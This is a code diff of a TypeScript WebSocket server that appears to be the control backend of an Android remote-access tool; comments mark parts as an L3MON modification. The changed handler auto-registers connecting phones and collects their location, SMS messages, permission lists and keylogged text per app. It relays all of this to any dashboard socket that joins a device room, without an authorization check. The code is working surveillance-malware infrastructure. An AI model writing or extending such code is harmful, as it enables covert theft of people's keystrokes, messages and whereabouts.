@@ -50,95 +50,125 @@ export class WebSocketManager {
   }
 
   private setupEventHandlers(): void {
-    this.io.on("connection", (socket: Socket) => {
-      console.log(`[WebSocket] Client connected: ${socket.id}`);
+    this.io.on("connection", async (socket: Socket) => {
+      const { model, manf, release, id: androidId } = socket.handshake.query;
+      console.log(`[WebSocket] New socket connected: ${socket.id} (Handshake ID: ${androidId || 'None'})`);
 
-      // User joins a device room
-      socket.on("join-device", (deviceId: number) => {
-        socket.join(`device:${deviceId}`);
-        if (!this.deviceConnections.has(deviceId)) {
-          this.deviceConnections.set(deviceId, new Set());
+      // 1. Device Registration / Identification
+      let connectedDeviceId: number | null = null;
+      if (androidId && model) {
+        try {
+          const db = await getDb();
+          if (db) {
+            const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, String(androidId))).limit(1);
+            if (deviceRecords.length > 0) {
+              connectedDeviceId = deviceRecords[0].id;
+              await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
+            } else {
+              const result = await db.insert(devices).values({
+                deviceId: String(androidId),
+                deviceName: `${manf || 'Android'} ${model}`,
+                manufacturer: String(manf || 'Unknown'),
+                model: String(model),
+                androidVersion: String(release || 'Unknown'),
+                ownerId: 1,
+                status: "online",
+                lastSeen: new Date(),
+              } as any);
+              connectedDeviceId = (result as any)[0]?.insertId;
+            }
+
+            if (connectedDeviceId) {
+              socket.join(`device:${connectedDeviceId}`);
+              if (!this.deviceConnections.has(connectedDeviceId)) {
+                this.deviceConnections.set(connectedDeviceId, new Set());
+              }
+              this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
+              console.log(`[WebSocket] Device ${connectedDeviceId} (${model}) is now ONLINE.`);
+              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
+            }
+          }
+        } catch (e) {
+          console.error("[WebSocket] Device registration failed:", e);
         }
-        this.deviceConnections.get(deviceId)!.add(socket.id);
-        console.log(`[WebSocket] User ${socket.id} joined device ${deviceId}`);
+      }
 
-        // Send last known location if available
-        const lastLocation = this.lastLocations.get(deviceId);
-        if (lastLocation) {
-          socket.emit("location-update", lastLocation);
+      // 2. User Handlers (Dashboard access)
+      socket.on("join-device", (targetId: number) => {
+        socket.join(`device:${targetId}`);
+        if (!this.deviceConnections.has(targetId)) {
+          this.deviceConnections.set(targetId, new Set());
         }
+        this.deviceConnections.get(targetId)!.add(socket.id);
+        console.log(`[WebSocket] User ${socket.id} joined device ${targetId}`);
 
-        // Send recent SMS if available
-        const recentSMS = this.lastSMS.get(deviceId);
-        if (recentSMS && recentSMS.length > 0) {
-          socket.emit("sms-batch", recentSMS);
+        // Sync initial state
+        const lastLoc = this.lastLocations.get(targetId);
+        if (lastLoc) socket.emit("location-update", lastLoc);
+        const lastSms = this.lastSMS.get(targetId);
+        if (lastSms) socket.emit("sms-batch", lastSms);
+      });
+
+      socket.on("leave-device", (targetId: number) => {
+        socket.leave(`device:${targetId}`);
+        this.deviceConnections.get(targetId)?.delete(socket.id);
+        console.log(`[WebSocket] User ${socket.id} left device ${targetId}`);
+      });
+
+      // 3. Device Data Handlers (Enhanced security with connectedDeviceId)
+      socket.on("device-location", async (data: DeviceLocation) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handleLocationUpdate({ ...data, deviceId: id });
+          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
         }
       });
 
-      // User leaves a device room
-      socket.on("leave-device", (deviceId: number) => {
-        socket.leave(`device:${deviceId}`);
-        const connections = this.deviceConnections.get(deviceId);
-        if (connections) {
-          connections.delete(socket.id);
-          if (connections.size === 0) {
-            this.deviceConnections.delete(deviceId);
+      socket.on("device-sms", async (data: SMSMessage) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handleSMSMessage({ ...data, deviceId: id });
+          this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
+        }
+      });
+
+      socket.on("device-status", (data: DeviceStatus) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          this.io.to(`device:${id}`).emit("status-update", { ...data, deviceId: id });
+        }
+      });
+
+      socket.on("device-permissions", async (data: { deviceId: number, permissions: any }) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handlePermissionUpdate({ deviceId: id, permissions: data.permissions });
+          this.io.to(`device:${id}`).emit("permissions-update", data.permissions);
+        }
+      });
+
+      socket.on("device-keylog", async (data: { deviceId: number, text: string, app: string, timestamp: number }) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handleKeylogUpdate({ ...data, deviceId: id });
+          this.io.to(`device:${id}`).emit("keylog-new", { ...data, deviceId: id });
+        }
+      });
+
+      // 4. Disconnect Handler
+      socket.on("disconnect", async () => {
+        if (connectedDeviceId) {
+          try {
+            const db = await getDb();
+            if (db) {
+              await db.update(devices).set({ status: "offline" }).where(eq(devices.id, connectedDeviceId));
+              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "offline", timestamp: Date.now() });
+              this.deviceConnections.get(connectedDeviceId)?.delete(socket.id);
+            }
+          } catch (e) {
+            console.error("[WebSocket] Offline update failed:", e);
           }
         }
-        console.log(`[WebSocket] User ${socket.id} left device ${deviceId}`);
-      });
-
-      // Device sends location update
-      socket.on("device-location", async (data: DeviceLocation) => {
-        try {
-          await this.handleLocationUpdate(data);
-          // Broadcast to all users watching this device
-          this.io.to(`device:${data.deviceId}`).emit("location-update", data);
-        } catch (error) {
-          console.error("[WebSocket] Error handling location update:", error);
-        }
-      });
-
-      // Device sends SMS
-      socket.on("device-sms", async (data: SMSMessage) => {
-        try {
-          await this.handleSMSMessage(data);
-          // Broadcast to all users watching this device
-          this.io.to(`device:${data.deviceId}`).emit("sms-received", data);
-        } catch (error) {
-          console.error("[WebSocket] Error handling SMS message:", error);
-        }
-      });
-
-      // Device sends status update
-      socket.on("device-status", (data: DeviceStatus) => {
-        console.log(`[WebSocket] Device ${data.deviceId} status: ${data.status}`);
-        // Broadcast to all users watching this device
-        this.io.to(`device:${data.deviceId}`).emit("status-update", data);
-      });
-
-      // [MOD L3MON] Device sends permission matrix
-      socket.on("device-permissions", async (data: { deviceId: number, permissions: any }) => {
-        try {
-          await this.handlePermissionUpdate(data);
-          this.io.to(`device:${data.deviceId}`).emit("permissions-update", data.permissions);
-        } catch (error) {
-          console.error("[WebSocket] Error handling permission update:", error);
-        }
-      });
-
-      // [MOD L3MON] Device sends keylog data
-      socket.on("device-keylog", async (data: { deviceId: number, text: string, app: string, timestamp: number }) => {
-        try {
-          await this.handleKeylogUpdate(data);
-          this.io.to(`device:${data.deviceId}`).emit("keylog-new", data);
-        } catch (error) {
-          console.error("[WebSocket] Error handling keylog update:", error);
-        }
-      });
-
-      // Disconnect handler
-      socket.on("disconnect", () => {
         console.log(`[WebSocket] Client disconnected: ${socket.id}`);
       });
     });
